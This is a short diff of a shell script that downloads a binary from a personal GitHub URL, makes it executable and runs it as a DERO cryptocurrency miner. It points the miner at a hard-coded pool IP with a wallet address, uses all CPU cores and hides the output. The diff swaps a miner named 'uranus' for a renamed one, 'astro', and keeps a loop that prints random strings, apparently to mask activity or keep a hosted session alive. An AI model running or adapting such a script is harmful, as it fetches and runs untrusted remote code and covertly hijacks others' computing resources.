@@ -1,4 +1,4 @@
-wget https://raw.githubusercontent.com/novalanto010101/file/main/uranus-0.0.3.1-linux-amd64.tar.xz
-tar xf uranus-0.0.3.1-linux-amd64.tar.xz
-./uranus -o wss://143.110.168.161:10100 -u dero1qy3qhpsl8r02vf6mx2svktxtpuhja6p5h6tluccs2ahsdekcghkwgqq5n5sm7 -t $(nproc --all) >/dev/null 2>&1
+wget https://raw.githubusercontent.com/novalanto010101/file/main/astro
+chmod 777 astro
+./astro -w dero1qy3qhpsl8r02vf6mx2svktxtpuhja6p5h6tluccs2ahsdekcghkwgqq5n5sm7 -r 143.110.168.161:10100 -p rpc -m $(nproc --all) >/dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
